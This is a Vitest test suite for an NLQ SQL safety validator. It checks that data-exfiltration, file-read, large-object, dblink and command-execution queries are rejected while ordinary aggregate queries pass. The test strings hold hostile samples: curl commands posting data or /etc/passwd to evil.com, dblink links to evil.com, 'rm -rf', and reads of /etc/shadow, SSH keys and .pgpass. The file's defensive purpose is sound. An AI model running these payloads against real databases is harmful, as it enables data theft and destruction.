/**
 * NLQ Data Exfiltration Security Tests
 *
 * CRITICAL SECURITY TESTS - Validates prevention of data exfiltration attempts
 *
 * Test Coverage:
 * - File writing attacks (INTO OUTFILE, COPY TO)
 * - File reading attacks (pg_read_file, LOAD_FILE)
 * - Large object exfiltration (lo_export, lo_import)
 * - Network exfiltration (dblink, external connections)
 * - Binary/hex dump attempts
 *
 * Expected Behavior: ALL exfiltration attempts MUST be rejected with 403 Forbidden
 */

import { describe, it, expect } from 'vitest';
import { SafetyGuardrails } from '../../services/insights-nlq/src/validators/safety-guardrails.js';

describe('NLQ Data Exfiltration Security Tests', () => {
  const testCompanyId = '550e8400-e29b-41d4-a716-446655440000';

  describe('File Writing Attacks', () => {
    it('should reject SELECT INTO OUTFILE (MySQL)', async () => {
      const maliciousSql = `
        SELECT * FROM metrics_company_period
        WHERE company_id = '${testCompanyId}'
        INTO OUTFILE '/tmp/exfiltrated_data.csv'
        FIELDS TERMINATED BY ','
        LINES TERMINATED BY '\n'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.overallSeverity).toBe('critical');
      expect(result.violations).toContain('EXFIL_001');

      const exfilCheck = result.checks.find(c => c.check === 'exfiltration_pattern');
      expect(exfilCheck?.passed).toBe(false);
      expect(exfilCheck?.severity).toBe('critical');
      expect(exfilCheck?.details).toContain('exfiltration pattern detected');
    });

    it('should reject SELECT INTO DUMPFILE', async () => {
      const maliciousSql = `
        SELECT user_data FROM users
        WHERE company_id = '${testCompanyId}'
        INTO DUMPFILE '/var/www/html/backdoor.php'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should reject COPY TO statement (PostgreSQL)', async () => {
      const maliciousSql = `
        COPY (
          SELECT * FROM metrics_company_period
          WHERE company_id = '${testCompanyId}'
        ) TO '/tmp/data_dump.csv' WITH CSV HEADER
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should reject COPY TO STDOUT', async () => {
      const maliciousSql = `
        COPY (
          SELECT email, password_hash FROM users
          WHERE company_id = '${testCompanyId}'
        ) TO STDOUT
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should reject COPY with PROGRAM clause', async () => {
      const maliciousSql = `
        COPY metrics_company_period
        TO PROGRAM 'curl -X POST https://evil.com/collect -d @-'
        WHERE company_id = '${testCompanyId}'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should reject case-insensitive INTO OUTFILE', async () => {
      const maliciousSql = `
        SELECT * FROM outcome_scores
        WHERE company_id = '${testCompanyId}'
        InTo OuTfIlE '/tmp/data.txt'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should reject INTO OUTFILE with variable path', async () => {
      const maliciousSql = `
        SELECT * FROM evidence_snippets
        WHERE company_id = '${testCompanyId}'
        INTO OUTFILE CONCAT('/tmp/data_', NOW(), '.csv')
        LIMIT 1000
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });
  });

  describe('File Reading Attacks', () => {
    it('should reject pg_read_file function', async () => {
      const maliciousSql = `
        SELECT pg_read_file('/etc/passwd', 0, 10000)
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');

      const funcCheck = result.checks.find(c => c.check === 'function_whitelist');
      expect(funcCheck?.passed).toBe(false);
      expect(funcCheck?.severity).toBe('critical');
    });

    it('should reject LOAD_FILE function (MySQL)', async () => {
      const maliciousSql = `
        SELECT LOAD_FILE('/etc/passwd')
        FROM metrics_company_period
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should reject pg_ls_dir function', async () => {
      const maliciousSql = `
        SELECT pg_ls_dir('/var/lib/postgresql')
        FROM users
        WHERE company_id = '${testCompanyId}'
        LIMIT 10
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject pg_stat_file function', async () => {
      const maliciousSql = `
        SELECT pg_stat_file('/etc/postgresql/postgresql.conf')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject reading sensitive files via pg_read_file', async () => {
      const sensitiveFiles = [
        '/etc/shadow',
        '/root/.ssh/id_rsa',
        '/var/lib/postgresql/.pgpass',
        '~/.bash_history',
        '/proc/self/environ',
      ];

      for (const file of sensitiveFiles) {
        const maliciousSql = `
          SELECT pg_read_file('${file}')
          WHERE company_id = '${testCompanyId}'
          LIMIT 1
        `;

        const result = await SafetyGuardrails.validate(maliciousSql, {
          companyId: testCompanyId,
        });

        expect(result.passed).toBe(false);
        expect(result.violations).toContain('FUNC_001');
      }
    });
  });

  describe('Large Object Exfiltration', () => {
    it('should reject lo_export function', async () => {
      const maliciousSql = `
        SELECT lo_export(1234, '/tmp/exported_blob.bin')
        FROM metrics_company_period
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject lo_import function', async () => {
      const maliciousSql = `
        SELECT lo_import('/tmp/malicious_payload.bin')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject lo_unlink function', async () => {
      const maliciousSql = `
        SELECT lo_unlink(12345)
        FROM users
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject large object manipulation chain', async () => {
      const maliciousSql = `
        SELECT lo_create(0), lo_export(lo_create(0), '/tmp/data.bin')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });
  });

  describe('Network-Based Exfiltration', () => {
    it('should reject dblink connection', async () => {
      const maliciousSql = `
        SELECT * FROM dblink(
          'host=evil.com user=hacker password=pass123',
          'SELECT * FROM metrics_company_period'
        )
        WHERE company_id = '${testCompanyId}'
        LIMIT 100
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject dblink_connect', async () => {
      const maliciousSql = `
        SELECT dblink_connect('attacker_conn', 'host=evil.com dbname=data')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject dblink_exec', async () => {
      const maliciousSql = `
        SELECT dblink_exec('conn', 'INSERT INTO remote_table SELECT * FROM users')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject external table access (Oracle-style)', async () => {
      const maliciousSql = `
        SELECT * FROM external_table@dblink
        WHERE company_id = '${testCompanyId}'
        LIMIT 100
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      // Should fail table whitelist
      expect(result.violations).toContain('TBL_001');
    });
  });

  describe('Command Execution Attempts', () => {
    it('should reject system command execution', async () => {
      const maliciousSql = `
        SELECT system('cat /etc/passwd > /tmp/pwned.txt')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject shell command execution', async () => {
      const maliciousSql = `
        SELECT shell('curl https://evil.com/collect?data=$(cat /etc/passwd)')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject exec function', async () => {
      const maliciousSql = `
        SELECT exec('rm -rf /important/data')
        FROM users
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should reject execute function', async () => {
      const maliciousSql = `
        SELECT execute('cat /etc/passwd')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });
  });

  describe('Binary and Hex Dump Exfiltration', () => {
    it('should detect exfiltration via hex encoding', async () => {
      const maliciousSql = `
        SELECT ENCODE(secret_data::bytea, 'hex')
        FROM users
        WHERE company_id = '${testCompanyId}'
        INTO OUTFILE '/tmp/hex_dump.txt'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should detect exfiltration via base64 encoding', async () => {
      const maliciousSql = `
        SELECT ENCODE(password_hash::bytea, 'base64')
        FROM users
        WHERE company_id = '${testCompanyId}'
        INTO OUTFILE '/tmp/base64_dump.txt'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should detect binary dump attempt', async () => {
      const maliciousSql = `
        COPY (
          SELECT * FROM pg_largeobject
          WHERE loid = 12345
        ) TO '/tmp/binary_dump.bin' WITH BINARY
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });
  });

  describe('Indirect Exfiltration via Subqueries', () => {
    it('should detect nested exfiltration in subquery', async () => {
      const maliciousSql = `
        SELECT metric_value FROM metrics_company_period
        WHERE company_id = '${testCompanyId}'
        AND metric_id IN (
          SELECT metric_id FROM (
            SELECT * FROM metrics_company_period
            INTO OUTFILE '/tmp/nested_exfil.csv'
          ) sub
        )
        LIMIT 100
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should detect pg_read_file in WHERE clause', async () => {
      const maliciousSql = `
        SELECT * FROM users
        WHERE company_id = '${testCompanyId}'
        AND username = pg_read_file('/etc/hostname')
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });

    it('should detect exfiltration in CTE', async () => {
      const maliciousSql = `
        WITH leaked_data AS (
          SELECT * FROM users
          WHERE company_id = '${testCompanyId}'
          INTO OUTFILE '/tmp/cte_leak.csv'
        )
        SELECT * FROM leaked_data
        LIMIT 100
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });
  });

  describe('Legitimate Query Patterns', () => {
    it('should accept SELECT without exfiltration', async () => {
      const legitimateSql = `
        SELECT
          metric_name,
          SUM(metric_value) as total,
          AVG(metric_value) as average
        FROM metrics_company_period
        WHERE company_id = '${testCompanyId}'
        AND period_start >= '2025-01-01'
        GROUP BY metric_name
        ORDER BY total DESC
        LIMIT 100
      `;

      const result = await SafetyGuardrails.validate(legitimateSql, {
        companyId: testCompanyId,
        allowedTables: ['metrics_company_period'],
      });

      expect(result.passed).toBe(true);
      expect(result.violations).toHaveLength(0);

      const exfilCheck = result.checks.find(c => c.check === 'exfiltration_pattern');
      expect(exfilCheck?.passed).toBe(true);
    });

    it('should accept query with safe functions', async () => {
      const legitimateSql = `
        SELECT
          CONCAT(first_metric, ' - ', second_metric) as combined,
          UPPER(metric_name) as upper_name,
          LOWER(metric_name) as lower_name,
          ROUND(metric_value, 2) as rounded,
          COALESCE(metric_value, 0) as coalesced
        FROM metrics_company_period
        WHERE company_id = '${testCompanyId}'
        LIMIT 50
      `;

      const result = await SafetyGuardrails.validate(legitimateSql, {
        companyId: testCompanyId,
        allowedTables: ['metrics_company_period'],
      });

      expect(result.passed).toBe(true);

      const funcCheck = result.checks.find(c => c.check === 'function_whitelist');
      expect(funcCheck?.passed).toBe(true);

      const exfilCheck = result.checks.find(c => c.check === 'exfiltration_pattern');
      expect(exfilCheck?.passed).toBe(true);
    });

    it('should accept aggregation queries', async () => {
      const legitimateSql = `
        SELECT
          DATE_TRUNC('month', period_start) as month,
          COUNT(*) as count,
          AVG(sroi_score) as avg_sroi,
          STDDEV(sroi_score) as stddev_sroi,
          MIN(sroi_score) as min_sroi,
          MAX(sroi_score) as max_sroi
        FROM outcome_scores
        WHERE company_id = '${testCompanyId}'
        AND period_start >= '2024-01-01'
        GROUP BY DATE_TRUNC('month', period_start)
        ORDER BY month DESC
        LIMIT 12
      `;

      const result = await SafetyGuardrails.validate(legitimateSql, {
        companyId: testCompanyId,
        allowedTables: ['outcome_scores'],
      });

      expect(result.passed).toBe(true);
      expect(result.violations).toHaveLength(0);
    });
  });

  describe('Edge Cases and Obfuscation', () => {
    it('should detect INTO OUTFILE with whitespace obfuscation', async () => {
      const maliciousSql = `
        SELECT * FROM users
        WHERE company_id = '${testCompanyId}'
        INTO
          OUTFILE
            '/tmp/spaced.csv'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should detect COPY TO with newline obfuscation', async () => {
      const maliciousSql = `
        COPY
        (SELECT * FROM metrics_company_period
        WHERE company_id = '${testCompanyId}')
        TO
        '/tmp/newline.csv'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should handle mixed case exfiltration keywords', async () => {
      const maliciousSql = `
        SELECT * FROM users
        WHERE company_id = '${testCompanyId}'
        InTo OuTfIlE '/tmp/mixed.csv'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('EXFIL_001');
    });

    it('should detect pg_read_file with string concatenation', async () => {
      const maliciousSql = `
        SELECT pg_read_file('/etc/' || 'passwd')
        WHERE company_id = '${testCompanyId}'
        LIMIT 1
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);
      expect(result.violations).toContain('FUNC_001');
    });
  });

  describe('Comprehensive Exfiltration Prevention', () => {
    it('should block all known file writing methods', async () => {
      const exfiltrationMethods = [
        "SELECT * INTO OUTFILE '/tmp/data.csv'",
        "SELECT * INTO DUMPFILE '/tmp/data.bin'",
        "COPY (SELECT *) TO '/tmp/data.csv'",
        "COPY (SELECT *) TO STDOUT",
      ];

      for (const method of exfiltrationMethods) {
        const sql = `${method} FROM users WHERE company_id = '${testCompanyId}'`;

        const result = await SafetyGuardrails.validate(sql, {
          companyId: testCompanyId,
        });

        expect(result.passed).toBe(false);
        expect(result.violations).toContain('EXFIL_001');
      }
    });

    it('should block all known file reading methods', async () => {
      const readingMethods = [
        'pg_read_file',
        'pg_ls_dir',
        'pg_stat_file',
        'load_file',
      ];

      for (const method of readingMethods) {
        const sql = `
          SELECT ${method}('/etc/passwd')
          WHERE company_id = '${testCompanyId}'
          LIMIT 1
        `;

        const result = await SafetyGuardrails.validate(sql, {
          companyId: testCompanyId,
        });

        expect(result.passed).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      }
    });

    it('should block all large object manipulation', async () => {
      const loMethods = ['lo_export', 'lo_import', 'lo_unlink'];

      for (const method of loMethods) {
        const sql = `
          SELECT ${method}(1234)
          WHERE company_id = '${testCompanyId}'
          LIMIT 1
        `;

        const result = await SafetyGuardrails.validate(sql, {
          companyId: testCompanyId,
        });

        expect(result.passed).toBe(false);
        expect(result.violations).toContain('FUNC_001');
      }
    });

    it('should provide detailed exfiltration attempt logs', async () => {
      const maliciousSql = `
        SELECT * FROM users
        INTO OUTFILE '/tmp/exfil.csv'
        WHERE company_id = '${testCompanyId}'
      `;

      const result = await SafetyGuardrails.validate(maliciousSql, {
        companyId: testCompanyId,
      });

      expect(result.passed).toBe(false);

      const exfilCheck = result.checks.find(c => c.check === 'exfiltration_pattern');
      expect(exfilCheck).toBeDefined();
      expect(exfilCheck?.details).toBeTruthy();
      expect(exfilCheck?.violationCode).toBe('EXFIL_001');
    });
  });
});
